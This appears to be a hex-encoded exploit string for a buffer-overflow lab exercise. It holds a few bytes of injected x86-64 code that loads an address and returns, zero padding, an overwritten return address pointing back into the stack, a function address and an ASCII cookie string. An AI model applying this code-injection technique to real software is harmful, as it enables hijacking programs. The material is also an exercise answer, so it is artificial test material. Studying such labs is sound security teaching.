48 c7 c7 60 e9 63 55 c3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
18 e9 63 55 00 00 00 00
33 16 40 00 00 00 00 00
33 30 63 64 31 65 65 34